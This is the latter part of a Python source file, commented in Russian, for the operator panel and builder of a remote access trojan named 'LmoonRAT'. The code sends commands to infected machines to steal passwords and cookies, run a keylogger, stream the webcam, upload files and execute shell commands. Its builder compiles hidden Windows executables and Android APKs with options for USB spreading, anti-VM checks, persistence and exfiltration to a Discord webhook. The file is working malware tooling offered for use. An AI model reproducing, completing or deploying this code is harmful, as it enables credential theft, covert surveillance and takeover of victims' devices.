                self.log(f"[!] Ошибка запуска демонстрации камеры {client['ip']}", "error")
    
    def show_camera_stream(self, client):
        self.camera_active = True
        camera_window = tk.Toplevel(self.root)
        camera_window.title(f"Камера: {client['ip']}")
        camera_window.geometry("640x480")
        
        img_label = tk.Label(camera_window)
        img_label.pack(fill=tk.BOTH, expand=True)
        
        stop_btn = tk.Button(camera_window, text="Остановить", 
                            command=lambda: self.stop_camera_stream(client, camera_window),
                            bg="#8B0000", fg="white")
        stop_btn.pack(pady=10)
        
        def update_image():
            try:
                while self.camera_active:
                    data = client["conn"].recv(4096)
                    if not data:
                        break
                    
                    try:
                        img = Image.open(io.BytesIO(data))
                        photo = ImageTk.PhotoImage(img)
                        
                        img_label.configure(image=photo)
                        img_label.image = photo
                        
                        camera_window.update()
                        time.sleep(0.05)
                    except:
                        pass
            except Exception as e:
                self.log(f"[!] Ошибка трансляции камеры: {str(e)}", "error")
            finally:
                camera_window.destroy()
        
        threading.Thread(target=update_image, daemon=True).start()
        
        camera_window.protocol("WM_DELETE_WINDOW", lambda: self.stop_camera_stream(client, camera_window))
    
    def stop_camera_stream(self, client, window):
        self.camera_active = False
        try:
            client["conn"].send(b"stop_camera")
        except:
            pass
        window.destroy()
    
    def get_passwords(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"get_passwords")
                self.log(f"[*] Запрос паролей от {client['ip']}", "info")
            except:
                self.log(f"[!] Ошибка запроса паролей {client['ip']}", "error")
    
    def get_cookies(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"get_cookies")
                self.log(f"[*] Запрос cookies от {client['ip']}", "info")
            except:
                self.log(f"[!] Ошибка запроса cookies {client['ip']}", "error")
    
    def get_all_data(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"get_data")
                self.log(f"[*] Запрос всех данных от {client['ip']}", "info")
            except:
                self.log(f"[!] Ошибка запроса всех данных {client['ip']}", "error")
    
    def uninstall_selected(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"uninstall")
                self.log(f"[*] Отправлена команда самоудаления {client['ip']}", "info")
            except:
                self.log(f"[!] Ошибка отправки команды самоудаления {client['ip']}", "error")
    
    def uninstall_all(self):
        for ip, client in list(self.clients.items()):
            try:
                client["conn"].send(b"uninstall")
                self.log(f"[*] Отправлена команда самоудаления {ip}", "info")
            except:
                self.log(f"[!] Ошибка отправки команды самоудаления {ip}", "error")
    
    def keylogger_control(self):
        client = self.get_selected_client()
        if not client:
            return
            
        k_window = tk.Toplevel(self.root)
        k_window.title(f"Управление кейлоггером: {client['ip']}")
        k_window.geometry("300x200")
        
        tk.Button(k_window, text="Запустить", 
                 command=lambda: self.send_keylog_cmd(client, "start"),
                 bg="#8B0000", fg="white").pack(pady=10)
        
        tk.Button(k_window, text="Остановить", 
                 command=lambda: self.send_keylog_cmd(client, "stop"),
                 bg="#8B0000", fg="white").pack(pady=10)
        
        tk.Button(k_window, text="Получить данные", 
                 command=lambda: self.send_keylog_cmd(client, "dump"),
                 bg="#8B0000", fg="white").pack(pady=10)
        
        tk.Button(k_window, text="Закрыть", 
                 command=k_window.destroy,
                 bg="#444444", fg="white").pack(pady=10)

    def send_keylog_cmd(self, client, cmd):
        try:
            client["conn"].send(f"keylog {cmd}".encode())
            self.log(f"[*] Команда кейлоггеру: {cmd} на {client['ip']}", "info")
        except:
            self.log(f"[!] Ошибка отправки команды кейлоггеру {client['ip']}", "error")
    
    def upload_file(self):
        client = self.get_selected_client()
        if not client:
            return
            
        filepath = filedialog.askopenfilename(title="Выберите файл для загрузки")
        if not filepath:
            return
            
        try:
            with open(filepath, 'rb') as f:
                file_data = f.read()
                
            b64_data = base64.b64encode(file_data).decode()
            filename = os.path.basename(filepath)
            
            client["conn"].send(f"upload {filename} {b64_data}".encode())
            self.log(f"[*] Отправка файла {filename} на {client['ip']}", "info")
        except Exception as e:
            self.log(f"[!] Ошибка отправки файла: {str(e)}", "error")
    
    # ========== ФУНКЦИИ МЕНЮ ==========
    def stop_server(self):
        self.server_running = False
        try:
            temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp_socket.connect(('127.0.0.1', 7777))
            temp_socket.close()
        except:
            pass
        self.log("[*] Сервер остановлен", "info")
        self.server_status.config(text="Server: Stopped", fg="red")

    # ========== ФУНКЦИОНАЛ БИЛДЕРА ==========
    def select_icon(self):
        file = filedialog.askopenfilename(filetypes=[("ICO files", "*.ico")])
        if file: self.icon_path.set(file)
    
    def test_webhook(self):
        webhook_url = self.discord_webhook.get()
        if not webhook_url:
            messagebox.showwarning("Ошибка", "URL вебхука не указан!")
            return
            
        try:
            payload = {"content": "✅ Тестовое сообщение от LmoonRAT Builder"}
            response = requests.post(webhook_url, json=payload, timeout=10)
            if response.status_code == 204:
                messagebox.showinfo("Успех", "Webhook успешно протестирован!")
            else:
                messagebox.showerror("Ошибка", f"Ошибка отправки: {response.status_code}")
        except Exception as e:
            messagebox.showerror("Ошибка", f"Ошибка тестирования webhook: {str(e)}")
    
    def open_build_dir(self):
        subprocess.Popen(f'explorer "{BUILD_DIR}"')
    
    def install_builder_dependencies(self):
        dependencies = [
            'psutil', 
            'browser_cookie3', 
            'requests',
            'mss',
            'pynput',
            'pillow',
            'opencv-python-headless',
            'pyaudio',
            'numpy',
            'pycryptodome',
            'py7zr',
            'pyautogui',
            'kivy',
            'buildozer'
        ]
        
        self.log("[*] Проверка зависимостей для билдера...", "info")
        
        for package in dependencies:
            try:
                spec = importlib.util.find_spec(package)
                if spec is None:
                    self.log(f"[>] Установка {package}...", "info")
                    
                    install_cmd = [sys.executable, "-m", "pip", "install"]
                    if package == "psutil":
                        install_cmd.append("--only-binary=:all:")
                    elif package == "opencv-python-headless":
                        install_cmd.append("opencv-python-headless")
                    
                    install_cmd.append(package)
                    
                    subprocess.check_call(install_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.log(f"[+] {package} успешно установлен", "success")
                else:
                    self.log(f"[+] {package} уже установлен", "info")
            except Exception as e:
                self.log(f"[!] Ошибка установки {package}: {str(e)}", "error")
                if package == "psutil":
                    self.log("[!] Рекомендация: Установите Microsoft Visual C++ Build Tools", "warning")
                    self.log("[!] Ссылка: https://visualstudio.microsoft.com/visual-cpp-build-tools/", "warning")
    
    def build_android_apk(self, py_path):
        """Сборка APK для Android"""
        try:
            self.log("[*] Начало сборки APK для Android...", "info")
            
            # Создаем временный каталог для Android проекта
            android_dir = os.path.join(BUILD_DIR, "android_build")
            if not os.path.exists(android_dir):
                os.makedirs(android_dir)
            
            # Копируем Python-скрипт
            shutil.copy(py_path, os.path.join(android_dir, "main.py"))
            
            # Создаем файл buildozer.spec
            spec_content = """
[app]
title = LmoonRAT
package.name = lmoonrat
package.domain = org.lmoon
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3,hostpython3,openssl,requests,pyjnius,kivy
orientation = portrait
osx.python_version = 3
osx.kivy_version = 2.1.0
fullscreen = 0
android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,CAMERA,RECORD_AUDIO
android.api = 30
android.minapi = 21
android.ndk = 21e
android.sdk = 33
android.ndk_path = 
android.sdk_path = 
p4a.branch = master
android.arch = armeabi-v7a
            """
            
            with open(os.path.join(android_dir, "buildozer.spec"), "w") as f:
                f.write(spec_content)
            
            # Запускаем сборку
            build_cmd = f"buildozer android debug"
            process = subprocess.Popen(
                build_cmd, 
                shell=True, 
                cwd=android_dir,
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            
            # Выводим прогресс в лог
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    self.log(output.strip(), "info")
            
            # Проверяем результат
            if process.returncode == 0:
                apk_path = os.path.join(android_dir, "bin", "lmoonrat-1.0-debug.apk")
                if os.path.exists(apk_path):
                    final_path = os.path.join(BUILD_DIR, "lmoonrat.apk")
                    shutil.copy(apk_path, final_path)
                    self.log(f"[+] APK успешно собран: {final_path}", "success")
                    self.open_build_dir()
                else:
                    self.log("[!] Ошибка: APK не найден после сборки", "error")
            else:
                self.log("[!] Ошибка сборки APK!", "error")
                
        except Exception as e:
            self.log(f"[!] Ошибка сборки APK: {str(e)}", "error")
            exc_type, exc_value, exc_traceback = sys.exc_info()
            self.log(''.join(traceback.format_exception(exc_type, exc_value, exc_traceback)), "error")
    
    def build_client(self):
        self.install_builder_dependencies()
        
        if self.test_mode.get():
            self.ip_entry.delete(0, tk.END)
            self.ip_entry.insert(0, "127.0.0.1")
            self.safe_mode.set(True)
            self.persistent_mode.set(False)
            self.log("[*] Активирован тестовый режим (localhost)", "info")
        
        host = self.ip_entry.get()
        port = int(self.port_entry.get())
        filename = self.filename_entry.get()
        icon_path = self.icon_path.get()
        file_extension = self.extension_entry.get()
        discord_webhook = self.discord_webhook.get()
        
        encrypt_key = os.urandom(16)
        encrypt_key_hex = base64.b64encode(encrypt_key).decode()
        
        self.log(f"[*] Используется IP: {host}", "info")
        
        client_code = CLIENT_TEMPLATE.replace("{SAFE_MODE}", "True" if self.safe_mode.get() else "False") \
            .replace("{DEBUG_MODE}", "True" if self.debug_mode.get() else "False") \
            .replace("{PERSISTENT}", "True" if self.persistent_mode.get() else "False") \
            .replace("{HIDE_FILE}", "True" if self.hide_file.get() else "False") \
            .replace("{ANTI_KILL}", "True" if self.anti_kill.get() else "False") \
            .replace("{STEAL_COOKIES}", "True" if self.steal_cookies.get() else "False") \
            .replace("{STEAL_PASSWORDS}", "True" if self.steal_passwords.get() else "False") \
            .replace("{ANTI_VM}", "True" if self.anti_vm.get() else "False") \
            .replace("{USB_SPREAD}", "True" if self.usb_spread.get() else "False") \
            .replace("{ANTI_UNINSTALL}", "True" if self.anti_uninstall.get() else "False") \
            .replace("{CAMERA_CAPTURE}", "True" if self.camera_capture.get() else "False") \
            .replace("{ENCRYPT_COMMS}", "True" if self.encrypt_comms.get() else "False") \
            .replace("{KEYLOGGER}", "True" if self.keylogger.get() else "False") \
            .replace("{FILE_TRANSFER}", "True" if self.file_transfer.get() else "False") \
            .replace("{ENABLE_PRANKS}", "True" if self.enable_pranks.get() else "False") \
            .replace("{DISCORD_WEBHOOK}", discord_webhook) \
            .replace("{ENCRYPT_KEY}", encrypt_key_hex) \
            .replace("{FILE_EXTENSION}", file_extension) \
            .replace("{HOST}", host) \
            .replace("{PORT}", str(port))
        
        py_path = os.path.join(BUILD_DIR, "client_temp.py")
        with open(py_path, "w", encoding="utf-8") as f:
            f.write(client_code)
            
        if self.build_apk.get():
            # Сборка APK для Android
            threading.Thread(target=self.build_android_apk, args=(py_path,)).start()
            return
            
        build_cmd = f'pyinstaller --noconsole --onefile --log-level=ERROR --noconfirm --clean'
        if icon_path:
            build_cmd += f' --icon="{icon_path}"'
        build_cmd += f' --distpath="{BUILD_DIR}"'
        build_cmd += f' --name="{filename}"'
        
        # Добавляем ВСЕ необходимые скрытые импорты
        hidden_imports = [
            'mss', 'pynput', 'cv2', 'pyaudio', 
            'Crypto.Cipher', 'Crypto.Util.Padding', 'pyautogui',
            'browser_cookie3', 'sqlite3', 'winreg', 'psutil',
            'PIL', 'PIL.Image', 'numpy', 'keyboard', 'py7zr',
            'ctypes', 'socket', 'threading', 'subprocess'
        ]
        for imp in hidden_imports:
            build_cmd += f' --hidden-import={imp}'
        
        # Особый обработчик для browser_cookie3
        if self.steal_cookies.get():
            try:
                import browser_cookie3
                module_path = os.path.dirname(browser_cookie3.__file__)
                if os.path.exists(module_path):
                    # Корректное добавление данных с экранированием
                    build_cmd += f' --add-data="{module_path}{os.pathsep}browser_cookie3"'
            except Exception as e:
                self.log(f"[!] Ошибка обработки browser_cookie3: {str(e)}", "error")
        
        build_cmd += f' "{py_path}"'
        
        threading.Thread(target=self.run_build, args=(build_cmd, py_path, filename)).start()
        self.log("[*] Начало сборки клиента...", "info")
        self.log(f"[>] Команда: {build_cmd}", "info")
    
    def run_build(self, cmd, py_path, filename):
        try:
            process = subprocess.Popen(
                cmd, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            stdout, stderr = process.communicate()
            
            if process.returncode == 0:
                self.log("[+] Сборка успешна!", "success")
                self.log(f"[+] Клиент сохранен: {BUILD_DIR}\\{filename}.exe", "success")
                
                if self.auto_start.get():
                    exe_path = os.path.join(BUILD_DIR, f"{filename}.exe")
                    if os.path.exists(exe_path):
                        subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)
                        self.log("[+] Клиент автоматически запущен", "success")
                
                if self.auto_clean.get():
                    temp_files = [
                        os.path.join(BUILD_DIR, "client_temp"),
                        os.path.join(BUILD_DIR, "build"),
                        py_path,
                        os.path.join(os.getcwd(), "WindowsUpdate.exe.spec")
                    ]
                    
                    for path in temp_files:
                        if os.path.exists(path):
                            if os.path.isdir(path):
                                shutil.rmtree(path, ignore_errors=True)
                            else:
                                try:
                                    os.remove(path)
                                except:
                                    pass
                
                if self.safe_mode.get():
                    self.log("[!] ВНИМАНИЕ: Клиент собран в безопасном режиме", "warning")
                
                self.open_build_dir()
            else:
                self.log("[!] Ошибка сборки!", "error")
                error_lines = [line for line in stderr.split('\n') if 'error' in line.lower()]
                self.log('\n'.join(error_lines[:10]), "error")
                
        except Exception as e:
            self.log(f"[!] Критическая ошибка: {str(e)}", "error")

    def execute_command(self):
        cmd = self.cmd_entry.get()
        if not cmd:
            return
            
        self.cmd_output.insert(tk.END, f">>> {cmd}\n")
        self.cmd_entry.delete(0, tk.END)
        
        for ip, client in self.clients.items():
            try:
                client["conn"].send(f"cmd {cmd}".encode())
                self.cmd_output.insert(tk.END, f"[{ip}] Команда отправлена\n")
            except:
                self.cmd_output.insert(tk.END, f"[{ip}] Ошибка отправки\n")
        
        self.cmd_output.see(tk.END)
    
    # ========== ФУНКЦИИ ПРИКОЛОВ ==========
    def execute_prank(self, prank_type):
        client = self.get_selected_client()
        if not client:
            return
            
        try:
            client["conn"].send(f"prank {prank_type}".encode())
            self.log(f"[*] Выполнение прикола '{prank_type}' на {client['ip']}", "info")
        except:
            self.log(f"[!] Ошибка выполнения прикола {client['ip']}", "error")

    def show_prank_menu(self):
        prank_window = tk.Toplevel(self.root)
        prank_window.title("Выберите прикол")
        prank_window.geometry("400x300")
        
        pranks = [
            ("Инвертировать экран", "invert_screen"),
            ("Перевернуть экран", "rotate_screen"),
            ("Фейковый синий экран", "fake_bsod"),
            ("Отключить клавиатуру", "disable_keyboard"),
            ("Дергать мышкой", "mouse_jiggler"),
            ("Надоедливые popup", "annoying_popup"),
            ("Проиграть звук", "play_sound")
        ]
        
        for text, cmd in pranks:
            btn = tk.Button(
                prank_window, 
                text=text, 
                command=lambda c=cmd: self.execute_prank(c),
                bg="#8B0000", 
                fg="white",
                width=30,
                height=2
            )
            btn.pack(pady=5)

# ========== ЗАПУСК ПРИЛОЖЕНИЯ ==========
if __name__ == "__main__":
    root = tk.Tk()
    app = RatController(root)
    root.mainloop()
